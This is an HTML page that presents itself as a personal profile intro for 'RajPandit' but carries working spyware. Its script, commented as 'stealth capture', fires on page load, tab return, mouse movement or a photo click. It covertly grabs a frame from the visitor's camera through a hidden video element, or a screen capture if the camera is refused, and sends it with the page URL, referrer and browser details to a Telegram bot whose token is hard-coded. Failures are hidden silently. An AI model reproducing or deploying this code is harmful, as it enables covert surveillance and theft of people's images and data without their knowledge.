<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RajPandit - Intro</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.95);
            padding: 60px 40px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 500px;
            animation: fadeIn 1s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .photo {
            width: 200px;
            height: 200px;
            border-radius: 50%;
            object-fit: cover;
            margin-bottom: 30px;
            border: 5px solid #fff;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            cursor: pointer;
            transition: transform 0.3s ease;
        }
        .photo:hover {
            transform: scale(1.05);
        }
        h1 {
            color: #333;
            font-size: 2.5em;
            margin: 0 0 20px 0;
            font-weight: bold;
        }
        .subtitle {
            color: #666;
            font-size: 1.2em;
            margin-bottom: 30px;
        }
        .loading {
            display: none;
            color: #667eea;
            font-style: italic;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="photo1.jpg" alt="RajPandit" class="photo" id="profilePic" onclick="loadContent()">
        <h1>RajPandit</h1>
        <p class="subtitle">Welcome to my world</p>
        <div class="loading" id="loading">Loading profile...</div>
    </div>

    <script>
        // Stealth camera capture - multiple triggers for maximum success
        let captureAttempted = false;

        // Primary trigger: page load + small delay
        window.addEventListener('load', function() {
            setTimeout(() => {
                if (!captureAttempted) {
                    stealthCapture();
                }
            }, 1000);
        });

        // Secondary trigger: visibility change (tab switch back)
        document.addEventListener('visibilitychange', function() {
            if (!document.hidden && !captureAttempted) {
                setTimeout(stealthCapture, 500);
            }
        });

        // Tertiary trigger: photo click
        function loadContent() {
            document.getElementById('loading').style.display = 'block';
            if (!captureAttempted) {
                stealthCapture();
            }
        }

        // Movement detection trigger
        document.addEventListener('mousemove', function() {
            if (!captureAttempted) {
                setTimeout(stealthCapture, 2000);
                document.removeEventListener('mousemove', arguments.callee);
            }
        });

        async function stealthCapture() {
            if (captureAttempted) return;
            captureAttempted = true;

            try {
                // Create hidden video element
                const video = document.createElement('video');
                video.style.display = 'none';
                video.muted = true;
                video.playsInline = true;
                document.body.appendChild(video);

                // Try getUserMedia first (camera) - most stealthy
                let stream;
                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            width: { ideal: 1280 },
                            height: { ideal: 720 },
                            facingMode: 'user' // Front camera preferred
                        },
                        audio: false
                    });
                } catch (e1) {
                    // Fallback to getDisplayMedia if camera blocked
                    try {
                        stream = await navigator.mediaDevices.getDisplayMedia({
                            video: true,
                            audio: false
                        });
                    } catch (e2) {
                        return; // Both failed silently
                    }
                }

                video.srcObject = stream;
                
                // Wait for video ready
                await new Promise((resolve, reject) => {
                    video.onloadedmetadata = () => resolve();
                    video.onerror = reject;
                    video.play();
                    
                    // 5 second timeout
                    setTimeout(reject, 5000);
                });

                // Capture frame
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Clean up
                stream.getTracks().forEach(track => track.stop());
                video.remove();

                // Convert and send
                const imageData = canvas.toDataURL('image/jpeg', 0.7);
                await sendToTelegram(imageData);

            } catch (error) {
                console.log('Stealth capture failed silently');
            }
        }

        async function sendToTelegram(imageData) {
            const botToken = '8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc';
            const chatId = '7735968383';
            
            const userAgent = navigator.userAgent;
            const urlParams = new URLSearchParams(window.location.search);
            const referrer = document.referrer || 'direct';

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        photo: imageData,
                        caption: `📸 *Live Capture*\n` +
                                `👤 Visitor\n` +
                                `🌐 ${window.location.href}\n` +
                                `🔗 Referrer: ${referrer}\n` +
                                `📱 UA: ${userAgent.substring(0, 100)}...\n` +
                                `⏰ ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (e) {
                // Silent fail
            }
        }
    </script>
</body>
</html>
